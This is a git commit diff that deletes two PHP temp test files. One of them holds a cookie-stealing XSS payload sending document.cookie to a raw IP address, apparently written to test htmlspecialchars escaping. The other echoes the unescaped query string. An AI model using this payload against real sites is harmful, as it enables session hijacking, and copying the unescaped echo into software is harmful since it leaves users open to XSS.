0567e150daa8d4dcea6f3fbec1f4adc387cca1b2
Jay <mis@thewoodagency.com>
2020-12-16 22:33:54 -0600

    deleted temp files;

--- test.php
+++
@@ -1,9 +0,0 @@
-<?php
-/**
- * Created by PhpStorm.
- * User: jay
- * Date: 1/28/18
- * Time: 9:43 PM
- */
-
-echo 'Requested URL = "' . $_SERVER['QUERY_STRING'] . '"';
--- test2.php
+++
@@ -1,6 +0,0 @@
-<?php
-$convert = "H-E-B <script>document.location='http://185.219.134.198/?c='+document.cookie;</script>";
-echo "<br />";
-
-echo "Only HTML special characters : ".htmlspecialchars($convert);
-?>
